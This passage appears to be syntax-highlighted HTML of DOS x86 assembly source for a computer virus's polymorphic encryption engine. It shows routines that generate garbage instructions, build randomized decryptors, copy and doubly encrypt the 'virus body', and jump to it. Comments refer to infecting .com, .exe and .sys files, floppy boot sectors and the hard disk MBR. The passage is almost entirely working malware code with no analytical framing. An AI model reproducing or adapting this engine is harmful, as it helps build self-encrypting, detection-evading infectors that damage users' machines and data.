                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">get_rnd_key</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Get random crypt value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_rnd_key</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">clave_crypt</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

                </span><span class="sc1">;Fill our buffer with garbage</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_seg</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">fill_rnd_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">fill_rnd_2</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc1">;Now es:di points to the buffer were engine put polymorphic code</span><span class="sc0">
</span><span class="sc5">choose_type</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc1">;Select the type of filler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_step_table</span><span class="sc4">-</span><span class="sc5">step_table</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">

                </span><span class="sc1">;Avoid same types in a row</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_step_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">choose_type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_step_type</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get displacement into subroutine table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get subroutine address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">step_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Add delta offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc1">;Save return address</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">step_return</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc1">;Save subroutine address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;This is for later operations</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">step_return</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check decryptor size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">check_decryptor_ready</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">try_new_generation</span><span class="sc0">

</span><span class="sc5">check_decryptor_ready</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check if decrytor already build</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">choose_type</span><span class="sc0">

                </span><span class="sc1">;Generate some garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">

                </span><span class="sc1">;Generate a jump to virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Copy virus body to the working area</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">virus_body</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc4">-</span><span class="sc5">decryptor</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Generate second encryption layer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">clave_crypt</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">second_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc4">-(</span><span class="sc5">second_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">generate_second</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">generate_second</span><span class="sc0">

                </span><span class="sc1">;Generate polymorphic encryption</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc4">-(</span><span class="sc5">decryptor</span><span class="sc4">+</span><span class="sc5">file_header_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc1">;Clear prefetch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        
</span><span class="sc5">load_crypt</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc5">encrypt_here</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Encrypt instruction ( add/sub/xor al,bl )</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">load_crypt</span><span class="sc0">

                </span><span class="sc1">;Restore all regs and return to infection routine       </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Get a valid opcode for memory operations                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">get_seg_reg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_com</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">use_ds_es</span><span class="sc0">

                </span><span class="sc1">;Use just cs on .sys .exe files and floppy boot and hd mbr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">use_ds_es</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Use also ds es in .com files</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate next decryptor instruction                                       ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">next_decryptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Next instruction counter</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Check for subroutines witch contains next decryptor instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">build_now</span><span class="sc0">

                </span><span class="sc1">;If so build a call instruction to that subroutine</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_call_decryptor</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">build_now</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Else get next instruction to build</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Generate decryption instructions just into subroutines</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">entry_from_sub</span><span class="sc0">

                </span><span class="sc1">;No instruction was created so restore old pointer</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">entry_from_sub</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Entry point if calling from decryptor subroutine building</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc1">;Build instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instruction_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc1">;Save subroutine address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Load counter register                                                     ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inst_load_counter</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Store size of encrypted data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc4">-(</span><span class="sc5">decryptor</span><span class="sc4">+</span><span class="sc5">file_header_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Load pointer to encrypted data                                            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inst_load_pointer</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Generate garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">

                </span><span class="sc1">;Pointer reg determination</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Store offset position of encrypted data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_body</span><span class="sc0">

                </span><span class="sc1">;Add delta offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Include displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">displ_si_di</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Generate garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Decrypt one byte from encrypted data area                                 ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inst_decrypt_one</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check type of decrypt sequence</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_seq</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">decrypt_with_reg</span><span class="sc0">

                </span><span class="sc1">;Decode add/sub/xor byte ptr seg:[si/di+displ],key</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_1</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Store operation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_fast_table</span><span class="sc4">-</span><span class="sc5">fast_table</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">

